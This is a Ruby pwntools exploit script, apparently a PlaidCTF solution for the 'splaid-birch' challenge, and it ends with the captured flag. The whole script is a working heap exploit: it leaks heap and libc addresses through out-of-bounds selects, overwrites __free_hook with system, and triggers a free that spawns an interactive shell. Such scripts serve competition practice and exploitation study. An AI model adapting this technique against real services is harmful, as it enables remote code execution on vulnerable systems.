#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget

# @magic = one_gadget(file: './libc.so.6')[0]

host, port = 'splaid-birch.pwni.ng', 17579
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'splaid-birch'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
def debug!; context.log_level = :debug; end
#================= Exploit Start ====================
context.arch = :amd64
# debug!
def cmd(c, *args)
  z.puts "#{c} #{args.map(&:to_s).join(' ')}"
end

def add(key, val)
  @top_idx ||= 0
  cmd(5, key, val)
  @top_idx += 1
end

def select(idx)
  cmd(4, idx)
end

def del(key)
  cmd(1, key)
end

def cover(val, key1, key2)
  cmd(7, val, key1, key2)
end

add(0xde006873, 111)
add(0xdeadbeef + 1, 222)

select(531)
heap = z.gets.to_i - 0x12f8
h.offset heap
log.dump heap.hex

select(0) # let the broken root come back
z.gets "111\n"
# add(0xcaceb00c, 333)
# select(531)
what = 0xe0000000
# 2.times { |i| add(what + i, 0); del(what + i) }
160.times { |i| add(what + i, i*0x100);
  del(what + i) if [12, 13, 14, 15].include?(i)
}
del(what + 100) # don't consume unsorted bin
unsort_chunk = heap + 0x2fc0
add(0x12345, unsort_chunk - 8)
select(-589 + 2**64)
libc = z.gets.to_i - 0x3ebca0
h.offset libc
log.dump libc.hex

select(0)
del(0x12345)
free_hook = libc + 0x3ed8e8
add(0x6789, free_hook - 16)
select(-589 + 2**64)
system = libc + 0x4f440
cover(system, 0, 0)
select(0)
del(0xde006873)

z.interact

# PCTF{7r335_0n_h34p5_0n_7r335_0n_5l3470r}
